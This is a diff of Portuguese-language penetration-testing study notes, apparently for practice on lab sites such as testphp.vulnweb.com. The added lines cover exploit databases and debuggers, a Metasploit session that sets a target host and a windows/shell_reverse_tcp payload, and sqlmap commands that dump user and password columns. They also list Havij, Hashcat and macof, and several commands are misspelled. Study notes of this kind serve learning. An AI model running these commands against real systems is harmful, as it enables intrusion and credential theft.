@@ -43,10 +43,36 @@ NMAP NSE - Usando para verificar se existe IDS/IPS
 
 
 3. Exploração do Alvo
+    Site:    Exploit Database
+             0day.today
+        
+    Processo de desenvolvimento de Exploits
+        Debugger - 
+            Ferramenta: Immunity Debugger - Free - Windows
+
+            Hex-Hail - IDA PRO 
 
 
-Site:   Exploit Database
-        0day.today
+        Assembly (linguagem)
+        Criar o Exploit (python, Ruby, ...)
+
+        https://cve.mitre.org/
+
+    Metasploit - Framework de Exploit (Desenvolvimento de Exploits)
+        No linux Kali - msf5
+        # mfsconsole
+        mfs5> search [Falha qye esta na CVE]
+        mfs5> search MS05-067
+        mfs5> use [nome do modulo]
+        mfs5> show option
+        mfs5> set RHOSTS [IP ALVO]
+        mfs5> Exploit
+            meterpreter (Payload)> sysinfo
+            meterpreter> exist
+        mfs5> set payload windows/shell_reverse_tcp
+        mfs5> show option
+        mfs5> exploit
+        
 
 Hack this site.org
 
@@ -55,7 +81,14 @@ Usada para SQL Injection
 Dica: ir sempre na documentação oficial da ferramenta.
 https://wwww.[url].*.*/[programa web].php?[parametro]
 # sqlmap -u [site alvo] -dbs
-# sqlmap -u [site alvo] -dbs -D -acuart -T users -C name,pass,
+# sqlmap -u [site alvo] -dbs -D -acuart -tables
+
+Para puxar os Dados de senha e usuário de uma Database
+# sqlmap -u [site alvo] -dbs -D -acuart -T [Tabela Alvo] -C [Parametro] --dump
+# sqlmap -u [site alvo] -dbs -D -acuart -T users -C name,pass,uname,email --dump
+
+Aplicação - havij
+Coloca o url
 
 
 acunetix -> site para teste
@@ -72,3 +105,7 @@ testephp.vulnweb.com
 
 8.
 
+suricata
+Nesus
+macof
+Hashcat - quebra N algoritimos
